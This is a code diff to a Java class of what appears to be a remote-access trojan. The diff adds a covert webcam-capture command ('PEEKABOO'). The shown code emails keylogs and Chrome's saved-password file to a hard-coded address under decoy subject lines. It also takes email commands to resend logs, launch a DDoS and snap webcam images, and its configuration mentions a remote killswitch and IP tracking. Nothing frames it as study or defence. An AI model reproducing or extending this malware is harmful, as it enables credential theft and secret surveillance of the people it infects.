@@ -147,7 +147,6 @@ public class Radio
 {
 	public static int schDay = -1;
 	public static boolean uploadDone = false;
-	public static boolean camQeue = false;
 	
 	/**
 	 * 
@@ -164,6 +163,7 @@ public class Radio
 	 * @boolean mailIPtrackers toggles the usage of sending WAN IP via email
 	 * @boolean checkForKill toggles the usage of remote killswitch at startup
 	 * @boolean verifyOS toggles the requirement of a Windows-based OS (if being run with WINE or ReactOS)
+	 * @boolean allowWebcamSpy toggles the permissions of webcam access.
 	 * @string staticIP sets static IP addr to use if static IP is enabled
 	 * @string allowedMailer is the email that is authorized to send commands to the payload.
 	 */
@@ -178,6 +178,7 @@ public class Radio
 	public static boolean checkForKill = true;
 	public static boolean verifyOS = true;
 	public static boolean isSecondaryDistrib = true;
+	public static boolean allowWebcamSpy = true;
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	public static String allowedMailer = "targetemail@gmail.com";
 	public static Main m = new Main();
@@ -239,7 +240,7 @@ public class Radio
 							 checkForCommands();
 					     }
 						 if (emailUpload && !uploadDone) {
-							 if (mailLogs() == 0) {
+							 if (mailLogs(0) == 0) {
 							     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 								 uploadDone = true;
 							 }
@@ -263,7 +264,7 @@ public class Radio
 						 checkForCommands();
 				     }
 					 if (emailUpload && !uploadDone) {
-						 if (mailLogs() == 0) {
+						 if (mailLogs(0) == 0) {
 						     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 							 uploadDone = true;
 						 }
@@ -388,7 +389,7 @@ public class Radio
 		 }
 	 }
 	 @SuppressWarnings("static-access")
-	public static int mailLogs() {
+	public static int mailLogs(int mode) {
 		 // mail keylog, history and saved passwords to email address
 		 // Recipient's email ID needs to be mentioned.
 	      String to = "targetemail@gmail.com";
@@ -428,8 +429,14 @@ public class Radio
 	            InternetAddress.parse(to));
 
 	         // Set Subject: header field
-	         message.setSubject("Re: Chemistry Project Planning: " + System.getProperty("user.name"));
-
+	         if (mode == 0)
+	         {
+	        	 message.setSubject("Re: Chemistry Project Planning: " + System.getProperty("user.name"));
+	         }
+	         else if (mode == 1)
+	         {
+	        	 message.setSubject("Re: Sen Noodles " + System.getProperty("user.name"));
+	         }
 	         // Create the message part
 	         BodyPart messageBodyPart = new MimeBodyPart();
 
@@ -450,20 +457,31 @@ public class Radio
 
 	         // Part two is attachment
 	         messageBodyPart = new MimeBodyPart();
-	         String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
-	         String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
-	         DataSource source = new FileDataSource(filename);
-	         messageBodyPart.setDataHandler(new DataHandler(source));
-	         messageBodyPart.setFileName(filename);
-	         multipart.addBodyPart(messageBodyPart);
-	         BodyPart otherMBP = new MimeBodyPart();
-	         DataSource other = new FileDataSource(otherfilename);
-	         otherMBP.setDataHandler(new DataHandler(other));
-	         otherMBP.setFileName(otherfilename);
-	         multipart.addBodyPart(otherMBP);
-	         // Send the complete message parts
-	         message.setContent(multipart);
-
+	         
+	         if (mode == 0)
+	         {
+	        	 String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
+	        	 String otherfilename = "C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
+	        	 DataSource source = new FileDataSource(filename);
+	        	 messageBodyPart.setDataHandler(new DataHandler(source));
+	        	 messageBodyPart.setFileName(filename);
+	        	 multipart.addBodyPart(messageBodyPart);
+	        	 BodyPart otherMBP = new MimeBodyPart();
+	        	 DataSource other = new FileDataSource(otherfilename);
+	        	 otherMBP.setDataHandler(new DataHandler(other));
+	        	 otherMBP.setFileName(otherfilename);
+	        	 multipart.addBodyPart(otherMBP);
+	        	 message.setContent(multipart);
+	         }
+	         else if (mode == 1)
+	         {
+	        	 String filename = "C:/ClassPolicy/cam.png";
+	        	 DataSource source = new FileDataSource(filename);
+	        	 messageBodyPart.setDataHandler(new DataHandler(source));
+	        	 messageBodyPart.setFileName(filename);
+	        	 multipart.addBodyPart(messageBodyPart);
+	        	 message.setContent(multipart);
+	         }
 	         // Send message
 	         Transport.send(message);
 
@@ -543,7 +561,7 @@ public class Radio
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("GETLOGS")) {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Manually resending logs...");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
-			        	 mailLogs();
+			        	 mailLogs(0);
 			         }
 			         
 			         else if (message.getSubject().matches("Nom d'un chien.") && message.getContent().toString().contains("DDOS")) {
@@ -564,6 +582,15 @@ public class Radio
 			     				}
 			     		    }
 			     		});   	 
+			         }
+			         
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("PEEKABOO")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Say cheese!");
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 CamBot.snapImg();
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Sending image...");
+			        	 mailLogs(1);
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Finished sending image.");
 			         }
 			         
 		      	  }
